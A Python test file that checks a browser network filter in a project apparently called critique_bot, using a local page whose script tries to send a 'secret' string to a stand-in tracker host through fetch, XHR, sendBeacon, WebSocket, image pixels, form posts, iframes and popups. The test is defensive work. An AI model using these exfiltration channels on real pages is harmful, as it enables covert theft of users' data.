"""A chat page under crit's filter cannot reach any other host, by any channel (needs Chrome or Edge).

chat.test serves a page that tries every way out; tracker.test records what arrives.
Both resolve to 127.0.0.1 through Chrome's resolver rules, so the filter sees real
host names. A control run with the filter off proves the channels are real.
"""

from __future__ import annotations

import http.server
import os
import shutil
import tempfile
import threading
import unittest
from unittest.mock import patch

from critique_bot import browser


def _chrome() -> str:
    for name in ("google-chrome", "microsoft-edge", "microsoft-edge-stable", "chromium"):
        if shutil.which(name):
            return name
    return ""


class _Tracker(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def log_message(self, *args):
        pass

    def _note(self, method: str) -> None:
        websocket = " (websocket)" if self.headers.get("Upgrade") else ""
        _Tracker.hits.append(method + " " + self.path.split("?")[0] + websocket)

    def do_GET(self):
        self._note("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<p>t</p>")

    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        self._note("POST")
        self.send_response(204)
        self.end_headers()


def _page(tracker: str) -> str:
    ws = tracker.replace("http", "ws")
    return f"""<!doctype html><html><head><link rel="preconnect" href="{tracker}/pre">
<script src="{tracker}/script.js"></script></head><body><p id="s">chat</p>
<img src="{tracker}/img.png"><iframe src="{tracker}/iframe"></iframe>
<script>
setTimeout(() => {{
  fetch("{tracker}/fetch?d=secret").catch(() => {{}});
  const x = new XMLHttpRequest(); x.open("POST", "{tracker}/xhr"); x.send("secret");
  navigator.sendBeacon("{tracker}/beacon", "secret");
  try {{ new WebSocket("{ws}/ws"); }} catch (e) {{}}
  new Image().src = "{tracker}/pixel.gif?d=secret";
  const fr = document.createElement("iframe"); fr.name = "fr"; document.body.appendChild(fr);
  const f = document.createElement("form"); f.method = "POST"; f.action = "{tracker}/form"; f.target = "fr";
  document.body.appendChild(f); f.submit();
  window.open("{tracker}/popup");
}}, 300);
</script></body></html>"""


@unittest.skipUnless(os.environ.get("CRIT_TEST_CHROME") or _chrome(), "needs Chrome or Edge")
class BrowserEgressTests(unittest.TestCase):
    def setUp(self) -> None:
        _Tracker.hits = []
        self.tracker = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Tracker)
        tracker_url = f"http://tracker.test:{self.tracker.server_address[1]}"
        page = _page(tracker_url).encode()

        class Chat(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(page)

        self.chat = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Chat)
        for server in (self.tracker, self.chat):
            threading.Thread(target=server.serve_forever, daemon=True).start()
        self.chat_url = f"http://chat.test:{self.chat.server_address[1]}/"
        self.args = tuple(browser.EDGE_LAUNCH_ARGS) + ("--host-resolver-rules=MAP chat.test 127.0.0.1, MAP tracker.test 127.0.0.1",)

    def tearDown(self) -> None:
        for server in (self.tracker, self.chat):
            server.shutdown()
            server.server_close()

    def _run(self) -> list[str]:
        with patch.object(browser, "EDGE_LAUNCH_ARGS", self.args):
            with browser.launch_edge(
                headed=False, user_data_dir=tempfile.mkdtemp(), start_url=self.chat_url,
                timeout_ms=30_000, promote_missing_profile=False,
            ) as page:
                page.wait_for_timeout(3_000)
                self.assertEqual(page.inner_text("#s"), "chat")
        return sorted(set(_Tracker.hits))

    def test_nothing_reaches_another_host(self) -> None:
        self.assertEqual(self._run(), [])

    def test_control_without_the_filter_leaks(self) -> None:
        with patch.object(browser, "guard_page_network", lambda *args, **kwargs: None):
            hits = self._run()
        for expected in ("POST /form", "GET /iframe", "GET /ws (websocket)", "POST /xhr", "POST /beacon"):
            self.assertIn(expected, hits)


if __name__ == "__main__":
    unittest.main()
